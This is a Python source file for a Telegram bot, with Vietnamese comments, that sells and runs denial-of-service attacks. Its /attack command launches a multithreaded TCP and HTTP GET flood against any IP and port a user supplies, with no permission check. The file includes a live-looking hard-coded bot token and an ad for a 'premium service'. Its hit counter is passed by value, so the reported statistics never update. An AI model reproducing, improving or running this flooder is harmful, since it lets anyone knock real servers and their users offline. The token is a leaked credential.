import telebot
import threading
import socket
import time
import ssl
import random
import os
import json
import psutil
from concurrent.futures import ThreadPoolExecutor

# ================= CONFIGURATION =================
# 👉 THAY TOKEN MỚI TỪ @BotFather VÀO ĐÂY
TOKEN = "8791321078:AAEpT4N3wZbli5zE3van9MQiqs9e_sWW18o"
bot = telebot.TeleBot(TOKEN)

ADMIN_NAME = "--Shady--"
ADMIN_IDS = [5225888903]  # THAY ID CỦA BẠN

# ----------------- TỰ ĐỘNG TÍNH SỐ LUỒNG DỰA TRÊN RAM -----------------
def get_available_ram_mb():
    try:
        mem = psutil.virtual_memory()
        return mem.available // (1024 * 1024)
    except:
        return 512

def auto_max_workers():
    ram_mb = get_available_ram_mb()
    # Mỗi luồng ngốn khoảng 5-10MB, an toàn lấy 10MB/luồng
    max_by_ram = max(10, ram_mb // 10)
    # Giới hạn cứng 150 để tránh quá tải CPU và socket
    max_by_ram = min(max_by_ram, 150)
    return max_by_ram

MAX_WORKERS = auto_max_workers()
print(f"[RAM] Available: {get_available_ram_mb()} MB -> using {MAX_WORKERS} threads")

SHARED_SUCCESS = 0
WHITELIST_FILE = "whitelist.txt"
STATS_FILE = "stats.json"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
]

PATHS = ["/", "/index.html", "/api/v1/ping", "/login"]

ADS_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━\n"
    "💎 **PREMIUM SERVICE BY SHADY** 💎\n"
    "• *Uptime:* `99.9% Online`\n"
    "• *Support:* [xHope](https://t.me/hopedzx)\n"
    "━━━━━━━━━━━━━━━━━━"
)

HELP_MESSAGE = (
    "🌟 **HỆ THỐNG ĐIỀU KHIỂN** 🌟\n\n"
    "🚀 **LỆNH TẤN CÔNG:**\n"
    "└ `/attack [IP] [Port]` (TCP Flood)\n\n"
    "🛑 **LỆNH DỪNG:**\n"
    "└ `/stop`\n\n"
    "📊 **THÔNG TIN HỆ THỐNG:**\n"
    "├ `/status` - Xem RAM, CPU, số luồng\n"
    "└ `/stats` - Thống kê tấn công\n\n"
    "🔍 **CÔNG CỤ:**\n"
    "├ `/check [IP] [Port]`\n"
    "└ `/id`\n\n"
    "{ads}"
)

# ================= QUẢN LÝ DỮ LIỆU =================
def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_attacks": 0, "total_hits": 0}
    with open(STATS_FILE, "r") as f:
        try:
            return json.load(f)
        except:
            return {"total_attacks": 0, "total_hits": 0}

def save_stats(stats):
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def update_attack_stats(hits):
    stats = load_stats()
    stats["total_attacks"] += 1
    stats["total_hits"] += hits
    save_stats(stats)

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def load_whitelist():
    if not os.path.exists(WHITELIST_FILE):
        return set()
    with open(WHITELIST_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, "w") as f:
        for ip in whitelist:
            f.write(f"{ip}\n")

# ================= ENGINE TẤN CÔNG (TCP) =================
stop_attack_event = None
attack_executor = None

def run_attack(ip, port, stop_event, counter):
    payload_raw = os.urandom(2048)
    hyper_chunks = []
    for _ in range(5):
        chunk = b""
        for _ in range(1000):
            ua = random.choice(USER_AGENTS)
            path = random.choice(PATHS)
            chunk += (f"GET {path}?{random.getrandbits(16)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n").encode()
        hyper_chunks.append(chunk)

    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            if port == 443:
                context = ssl._create_unverified_context()
                s = context.wrap_socket(s, server_hostname=ip)
            s.connect((ip, port))
            while not stop_event.is_set():
                try:
                    if port in [80, 443]:
                        s.send(random.choice(hyper_chunks))
                        counter += 1000
                    else:
                        s.send(payload_raw)
                        counter += 1
                except:
                    break
            s.close()
        except:
            time.sleep(0.05)

def monitor_attack(chat_id, msg_id, ip, port, stop_event, total_hits):
    last_val = 0
    start_time = time.time()
    while not stop_event.is_set():
        try:
            time.sleep(1.5)
            cur_val = total_hits
            elapsed = time.time() - start_time
            rps = (cur_val - last_val) / 1.5
            last_val = cur_val
            m, s = divmod(int(elapsed), 60)
            status_text = (
                f"🚀 **ATTACK STATUS** 🚀\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 **Target:** `{ip}:{port}`\n"
                f"✅ **Hits:** `{cur_val:,}` | ⚡ **RPS:** `{rps:,.0f}`\n"
                f"⏳ **Time:** `{m:02d}:{s:02d}`\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔥 **Status:** `SYSTEM OVERLOADED`"
            )
            bot.edit_message_text(status_text, chat_id, msg_id, parse_mode='Markdown')
        except:
            pass
    final_hits = total_hits
    update_attack_stats(final_hits)
    bot.send_message(chat_id, f"🛑 **ATTACK STOPPED:** `{ip}`\n📊 Total Hits: `{final_hits:,}`", parse_mode='Markdown')

# ================= CÁC LỆNH TELEGRAM =================
@bot.message_handler(commands=['status'])
def handle_status(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Chỉ admin mới xem được.")
    mem = psutil.virtual_memory()
    cpu = psutil.cpu_percent(interval=1)
    threads = threading.active_count()
    text = (
        f"📊 **HỆ THỐNG**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💾 RAM: `{mem.used//(1024**2)}MB / {mem.total//(1024**2)}MB`\n"
        f"📉 RAM khả dụng: `{mem.available//(1024**2)}MB`\n"
        f"🖥 CPU: `{cpu}%`\n"
        f"🧵 Số luồng hiện tại: `{threads}` (tối đa `{MAX_WORKERS}`)\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"_Dùng /attack để bắt đầu_"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['check'])
def handle_check(message):
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ /check [IP] [Port]")
    ip = parts[1]
    port = int(parts[2]) if len(parts) > 2 else 80
    msg = bot.reply_to(message, f"🔍 Đang kiểm tra `{ip}:{port}`...", parse_mode='Markdown')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        start = time.time()
        result = s.connect_ex((ip, port))
        end = time.time()
        s.close()
        if result == 0:
            bot.edit_message_text(f"✅ **SERVER ALIVE**\n\n🎯 Host: `{ip}:{port}`\n📶 Ping: `{int((end-start)*1000)}ms`", message.chat.id, msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text(f"❌ **SERVER DEAD**\n\n🎯 Host: `{ip}:{port}`\n⚠️ Status: `Connection Refused`", message.chat.id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"❌ **LỖI**\n`{str(e)}`", message.chat.id, msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Admin only.")
    stats = load_stats()
    text = (
        "📊 **THỐNG KÊ TẤN CÔNG**\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🚀 Số cuộc tấn công: `{stats['total_attacks']}`\n"
        f"✅ Tổng hits: `{stats['total_hits']:,}`\n"
        f"🧵 Số luồng sử dụng: `{MAX_WORKERS}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['id', 'uid'])
def handle_id(message):
    bot.reply_to(message, f"🆔 Your ID: `{message.from_user.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global stop_attack_event, attack_executor, SHARED_SUCCESS
    if stop_attack_event and not stop_attack_event.is_set():
        return bot.reply_to(message, "⚠️ Another attack is active! Use /stop first.")
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ Usage: /attack [IP] [Port]")
    ip = parts[1]
    whitelist = load_whitelist()
    if ip in whitelist:
        return bot.reply_to(message, f"🛡 IP `{ip}` is whitelisted!")
    port = int(parts[2]) if len(parts) > 2 else 80

    SHARED_SUCCESS = 0
    stop_attack_event = threading.Event()
    initial_msg = bot.reply_to(message, f"⚡ **Starting TCP flood on {ip}:{port}**\n🚀 Using {MAX_WORKERS} threads...")

    attack_executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    for _ in range(MAX_WORKERS):
        attack_executor.submit(run_attack, ip, port, stop_attack_event, SHARED_SUCCESS)
    threading.Thread(target=monitor_attack, args=(message.chat.id, initial_msg.message_id, ip, port, stop_attack_event, SHARED_SUCCESS), daemon=True).start()

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global stop_attack_event, attack_executor
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Permission denied.")
    if stop_attack_event:
        stop_attack_event.set()
    if attack_executor:
        attack_executor.shutdown(wait=False)
    bot.reply_to(message, "🛑 Attack stopped!")

@bot.message_handler(commands=['wadd'])
def handle_wadd(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Admin only.")
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ /wadd [IP]")
    ip = parts[1]
    whitelist = load_whitelist()
    whitelist.add(ip)
    save_whitelist(whitelist)
    bot.reply_to(message, f"✅ Added `{ip}` to whitelist.", parse_mode='Markdown')

@bot.message_handler(commands=['wlist'])
def handle_wlist(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Admin only.")
    whitelist = load_whitelist()
    if not whitelist:
        return bot.reply_to(message, "Whitelist empty.")
    list_text = "🛡 **WHITELIST:**\n\n" + "\n".join(f"• `{ip}`" for ip in whitelist)
    bot.send_message(message.chat.id, list_text, parse_mode='Markdown')

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.send_message(message.chat.id, HELP_MESSAGE.format(ads=ADS_MESSAGE), parse_mode='Markdown')

# ================= KHỞI CHẠY =================
if __name__ == "__main__":
    print(f"--- SYSTEM READY | ADMIN: {ADMIN_NAME} ---")
    print(f"--- AUTO-CONFIG: {MAX_WORKERS} threads based on RAM ---")
    while True:
        try:
            print("Bot is polling...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(10)
